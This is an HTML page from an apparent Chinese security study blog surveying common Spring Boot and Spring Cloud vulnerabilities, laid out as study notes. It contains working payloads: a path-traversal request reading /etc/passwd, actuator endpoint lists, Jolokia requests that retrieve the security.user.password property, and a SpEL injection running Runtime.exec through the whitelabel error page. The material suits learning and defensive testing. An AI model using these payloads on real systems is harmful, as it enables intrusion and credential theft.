@@ -1,0 +1,146 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="Study Blog" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="Study Blog" type="application/atom+xml"><link rel="alternate" type="application/json" title="Study Blog" href="https://adm1n10086.github.io/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-TJYWEN4W.js"></link><link rel="modulepreload" href="/js/copy-tex-5WQQWDDJ.js"></link><link rel="modulepreload" href="/js/post-MTFXX2DR.js"></link><link rel="modulepreload" href="/js/chunk-VCQKHAXC.js"></link><link rel="modulepreload" href="/js/tcomments-BAHZGLNQ.js"></link><link rel="modulepreload" href="/js/chunk-UZQSPCFJ.js"></link><link rel="modulepreload" href="/js/pagefind-XLFDDGJK.js"></link><link rel="modulepreload" href="/js/index.esm-U7KDMHPR.js"></link><link rel="modulepreload" href="/js/chunk-ZZWXZBS4.js"></link><link rel="modulepreload" href="/js/chunk-VLOI3X32.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="/images/cover.png" as="image" fetchpriority="high"><meta name="keywords" content="网络安全"/><link rel="canonical" href="https://adm1n10086.github.io/2026/07/02/spring%20boot%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>spring boot常见漏洞</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">spring boot常见漏洞</h1><div class="meta"><span class="item" title="创建时间：2026-07-02 00:00:00"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-07-02T00:00:00+08:00">2026-07-02</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>3.9k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>4 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ZhIE BLOG</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="/images/cover.png" loading="eager" decoding="async" fetchpriority="high" alt="Study Blog"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://adm1n10086.github.io/2026/07/02/spring%20boot%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="ZhIE"/><meta itemprop="description" content=", "/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="Study Blog"/></span><div class="body md" itemprop="articleBody"><h1 id="java之springboot漏洞利用姿势合集总结详细版"><a class="anchor" href="#java之springboot漏洞利用姿势合集总结详细版">#</a> Java之SpringBoot漏洞利用姿势合集总结详细版</h1>
+<p>Spring 框架是一个功能强大的 Java 应用程序框架，旨在提供高效且可扩展的开发环境，不同部分的讲解，Spring生态系统中有五个关键部分，分别是<strong>Spring Framework、Spring Boot、Spring Cloud、Spring Security和Spring MVC</strong><br />
+简述如下：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>Spring Framework</span></span>
+<span class="line"><span>核心架构：提供依赖注入（IoC）、面向切面编程（AOP）、数据访问和事务管理等基础功能。</span></span>
+<span class="line"><span>Spring MVC：用于构建Web应用程序和RESTful服务的MVC框架。</span></span>
+<span class="line"><span>Spring MVC</span></span>
+<span class="line"><span>Web框架：基于Spring Framework的模块，用于开发Web应用和API。</span></span>
+<span class="line"><span>主要特性：DispatcherServlet、注解驱动、视图解析等。</span></span>
+<span class="line"><span>Spring Boot</span></span>
+<span class="line"><span>简化开发：基于Spring Framework，提供自动配置、内嵌服务器、快速启动等功能。</span></span>
+<span class="line"><span>主要特性：自动配置、内嵌Tomcat、独立运行、Starter依赖。</span></span>
+<span class="line"><span>Spring Cloud</span></span>
+<span class="line"><span>微服务架构：基于Spring Boot，提供构建分布式系统和微服务的工具。</span></span>
+<span class="line"><span>主要特性：服务发现、负载均衡、配置管理、断路器、API网关等。</span></span>
+<span class="line"><span>Spring Security</span></span>
+<span class="line"><span>安全框架：为Spring应用提供认证和授权功能。</span></span>
+<span class="line"><span>主要特性：身份验证、访问控制、Web安全保护。</span></span>
+<span class="line"><span>它们的关系</span></span>
+<span class="line"><span>Spring Framework：基础框架，包含核心功能和Spring MVC。</span></span>
+<span class="line"><span>Spring MVC：Spring Framework中的Web框架模块。</span></span>
+<span class="line"><span>Spring Boot：简化Spring应用开发，内置于Spring Framework之上。</span></span>
+<span class="line"><span>Spring Cloud：基于Spring Boot，支持微服务架构。</span></span>
+<span class="line"><span>Spring Security：集成在Spring Framework中，提供安全功能。</span></span></code></pre>
+<h1 id="spring-boot-starter"><a class="anchor" href="#spring-boot-starter">#</a> Spring Boot Starter</h1>
+<p>如果只是将xml配置换成javaconfig配置，其实减少不了配置的工作量。我们配置工作量的减少，还得感谢Spring Boot Starter，是它帮我们完成了大量的配置工作，我们只需完成很少一部分配置即可。</p>
+<p>springboot自动配置用到的注解 @SpringBootApplication、@SpringBootConfiguration、@ComponentScan @EnableAutoConfiguration、@AutoConfigrationPackage、@EnableConfigurationProperties<br />
+外部配置文件导入注解 @PropertySource<br />
+定时任务用到注解 @EnableScheduling、@Scheduled、@EnableAsync、@Async<br />
+过滤器 @WebFilter、@ServletComponentScan<br />
+拦截器<br />
+监听器<br />
+校验器 @Validated<br />
+异常处理 @ControllerAdvice、@ExceptionHandler</p>
+<p>自动加载原理：<br />
+SpringBoot 在启动时会去依赖的starter包中寻找 resources/META-INF/spring.factories文件，然后根据文件中配置的Jar包去扫描项目所依赖的Jar包，这类似于 Java 的 SPI 机制。注释：SPI的英文名称是Service Provider Interface，是Java 内置的服务发现机制。<br />
+根据spring.factories配置加载AutoConfigure类。<br />
+根据 @Conditional注解的条件，进行自动配置并将Bean注入Spring Context上下文当中</p>
+<h2 id="常见漏洞"><a class="anchor" href="#常见漏洞">#</a> 常见漏洞：</h2>
+<p>springboot-cve_2021_21234<br />
+环境：<a target="_blank" rel="noopener" href="http://vulfocus.cn">vulfocus.cn</a><br />
+Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者。</p>
+<p>存在文件包含漏洞<br />
+漏洞Poc<br />
+/manage/log/view?filename=/etc/passwd&amp;base=../../../../../../../../../../<br />
+修复方案：升级到 0.2.13</p>
+<h1 id="springcloud"><a class="anchor" href="#springcloud">#</a> SpringCloud</h1>
+<p>Spring Cloud是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。<br />
+参考大师傅的一张图：<br />
+<img loading="lazy" src="/source/images/spring/1.png" alt="alt text" /></p>
+<h2 id="信息泄露漏洞"><a class="anchor" href="#信息泄露漏洞">#</a> 信息泄露漏洞</h2>
+<p>此漏洞主要就是一些路由地址和接口的信息泄露，验证路由如下<br />
+利用工具springscan 扫描</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/v2/api-docs</span></span>
+<span class="line"><span>/swagger-ui.html</span></span>
+<span class="line"><span>/env</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>//获取参数信息</span></span>
+<span class="line"><span>/mappings</span></span>
+<span class="line"><span>/metrics</span></span>
+<span class="line"><span>/beans</span></span>
+<span class="line"><span>/configprops</span></span>
+<span class="line"><span>/actuator/metrics</span></span>
+<span class="line"><span>/actuator/mappings</span></span>
+<span class="line"><span>/actuator/beans</span></span>
+<span class="line"><span>/actuator/configprops</span></span></code></pre>
+<p>springscan地址：</p>
+<p>敏感信息明文获取<br />
+如果说目标网站存在一些接口依赖 jolokia-cor<br />
+如/jolokia、/actuator/jolokia</p>
+<p>调用 org.springframework.boot Mbean<br />
+实际上是调用org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty方法<br />
+poc</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>//spring 1.x 版本</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>markup</span></span>
+<span class="line"><span>POST /jolokia</span></span>
+<span class="line"><span>Content-Type: application/json</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#123;"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]&#125;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>//spring 2.x 版本</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>markup</span></span>
+<span class="line"><span>POST /actuator/jolokia</span></span>
+<span class="line"><span>Content-Type: application/json</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&#123;"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]&#125;</span></span></code></pre>
+<h1 id="远程代码执行"><a class="anchor" href="#远程代码执行">#</a> 远程代码执行</h1>
+<p>主要问题是在于springboot存在一些组件漏洞造成的的，总结如下一些方法</p>
+<p>Spring Boot whitelabel error page 远程命令执行漏<br />
+漏洞原理：主要是因为使用了springboot默认错误页在处理参数值使用递归流程，流程进入到PropertyPlaceholderHelper 类中，${}包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞<br />
+漏洞文件：ErrorMvcAutoConfiguration.java</p>
+<p>漏洞复现，测试网站是否存在Whitelabel Error Page，通过fuzz一些参数值，如id、sid存在500报错，则可以测试去执行Spel表达式注入<br />
+<img loading="lazy" src="/source/images/spring/2.png" alt="alt text" /><br />
+漏洞poc<br />
+生成16进制的脚本</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>input_string = "open -a Calculator"</span></span>
+<span class="line"><span>hex_list = []</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>for ch in input_string:</span></span>
+<span class="line"><span>    # 将字符转换为十六进制表示，并添加到列表中</span></span>
+<span class="line"><span>    hex_list.append(f"0x&#123;ord(ch):02x&#125;")</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>hex_string = ', '.join(hex_list)</span></span>
+<span class="line"><span>print(hex_string)</span></span></code></pre>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>//测试漏洞是否存在</span></span>
+<span class="line"><span>$&#123;6*6&#125;   //看是否有返回36</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>//执行Calc命令</span></span>
+<span class="line"><span>$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x63, 0x61, 0x6c, 0x63&#125;))&#125;</span></span></code></pre>
+<p>。。。。。。</p>
+<h1 id="参考内容"><a class="anchor" href="#参考内容">#</a> 参考内容：</h1>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14303">https://xz.aliyun.com/news/14303</a><br />
+侵删</p>
+<div class="tags"><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"><i class="ic i-tag"></i>网络安全</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-eye"></i></span><span class="text">总访问量：</span><span class="waline-pageview-count" id="twikoo_visitors" data-path="/2026/07/02/spring boot常见漏洞/">加载中...</span></span><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-07-02 11:40:05" itemprop="dateModified" datetime="2026-07-02T11:40:05+08:00">2026-07-02</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img loading="lazy" src="/assets/wechatpay.png" alt="ZhIE 微信支付"/><p>微信支付</p></div><div><img loading="lazy" src="/assets/alipay.png" alt="ZhIE 支付宝"/><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ZhIE<i class="ic i-at"><em>@</em></i>Study Blog</li><li class="link"><strong>本文链接：</strong><a href="https://adm1n10086.github.io/2026/07/02/spring%20boot%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" title="spring boot常见漏洞">https://adm1n10086.github.io/2026/07/02/spring boot常见漏洞/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/06/08/%E5%B8%B8%E8%A7%81web%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%86%E5%88%AB%E7%89%B9%E5%BE%81/" rel="prev" itemprop="url" data-background-image="&#x2F;images&#x2F;7.jpg" title="常见Web框架的识别特征"><span class="type">上一篇</span><h3>常见Web框架的识别特征</h3></a></div><div class="item right"><a href="/2026/07/02/%E4%BB%A3%E7%90%86%E6%B1%A0/" rel="next" itemprop="url" data-background-image="&#x2F;images&#x2F;3.jpg" title="如何使用fofa白嫖代理池"><span class="type">下一篇</span><h3>如何使用fofa白嫖代理池</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E4%B9%8Bspringboot%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E5%90%88%E9%9B%86%E6%80%BB%E7%BB%93%E8%AF%A6%E7%BB%86%E7%89%88"><span class="toc-number">1.</span> <span class="toc-text"> Java之SpringBoot漏洞利用姿势合集总结详细版</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#spring-boot-starter"><span class="toc-number">2.</span> <span class="toc-text"> Spring Boot Starter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.</span> <span class="toc-text"> 常见漏洞：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#springcloud"><span class="toc-number">3.</span> <span class="toc-text"> SpringCloud</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text"> 信息泄露漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">4.</span> <span class="toc-text"> 远程代码执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%86%85%E5%AE%B9"><span class="toc-number">5.</span> <span class="toc-text"> 参考内容：</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ZhIE" src="/assets/avatar.jpg"/><p class="name" itemprop="name">ZhIE</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">17</span><span class="name">文章</span></a></div><div class="item tags"><a href="/tags/"><span class="count">6</span><span class="name">标签</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/Adm1n10086" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;Adm1n10086"><i class="ic i-github"></i></a><a target="_blank" rel="noopener" href="https://music.163.com/#/user/home?id=128299268" class="item music" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;128299268"><i class="ic i-cloud-music"></i></a><a href="mailto:250278984@qq.com" class="item email" title="mailto:250278984@qq.com"><i class="ic i-envelope"></i></a><a target="_blank" rel="noopener" href="https://user.qzone.qq.com/250278984/infocenter?loginfrom=31" class="item qzone" title="https:&#x2F;&#x2F;user.qzone.qq.com&#x2F;250278984&#x2F;infocenter?loginfrom&#x3D;31"><i class="ic i-qq"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>Home</a></li><li class="item dropdown"><a href="#" onclick="return false;"><i class="ic i-user"></i>关于</a><ul class="submenu"><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于本站</a></li><li class="item"><a href="/admiration/" rel="section"><i class="ic i-coffee"></i>赞赏博主</a></li></ul></li><li class="item dropdown"><a href="#" onclick="return false;"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2026/07/02/%E4%BB%A3%E7%90%86%E6%B1%A0/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/06/08/%E5%B8%B8%E8%A7%81web%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%86%E5%88%AB%E7%89%B9%E5%BE%81/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/07/02/spring%20boot%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">spring boot常见漏洞</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/07/14/EDR/">安服仔要懂得EDR</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/14/hello-world/">Hello World</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/07/02/%E4%BB%A3%E7%90%86%E6%B1%A0/">如何使用fofa白嫖代理池</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/07/25/SRC%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%A3%81%E5%8E%BF%E6%8B%9B%E7%94%9FSQL%E6%B3%A8%E5%85%A5/">某招生网站存在sql注入</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/16/Apache%20Http%20Server%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/">Apache Http Server路径穿越漏洞（CVE-2021-41773）</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/05/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/">网络安全src学习</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/23/Elasticsearch%E5%A4%B1%E6%8E%A7%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Elasticsearch 未授权访问漏洞</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/08/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6%E3%80%81%E5%90%8E%E7%AB%AF%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%90%84%E7%B1%BB%20Web%20%E6%8A%80%E6%9C%AF/">Web前后端主流技术栈、框架、工具最全分类总结</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/08/%E5%B8%B8%E8%A7%81web%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%86%E5%88%AB%E7%89%B9%E5%BE%81/">常见Web框架的识别特征</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2><ul class="leancloud-recent-comment" id="new-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2025 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ZhIE @ ZhIE BLOG</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">98k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">1:29</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+    ispost: true,
+    path: `2026/07/02/spring boot常见漏洞/`,
+    favicon: {
+        show: `（●´3｀●）やれやれだぜ`,
+        hide: `(´Д｀)大変だ！`
+    },
+    search: {
+        placeholder: "文章搜索",
+        empty: "关于 「 ${query} 」，什么也没搜到",
+        stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    nocopy: "false",
+    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
+    copy_tex: false,
+    katex: false,
+    mermaid: false,
+    audio: undefined,
+    nocopy: false,
+    outime: true,
+    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
+    quiz: {
+        choice: `单选题`,
+        multiple: `多选题`,
+        true_false: `判断题`,
+        essay: `问答题`,
+        gap_fill: `填空题`,
+        mistake: `错题备注`
+    }
+};
+</script><script src="/js/siteInit.js?v=0.5.4" type="module" fetchpriority="high" defer></script></body></html>
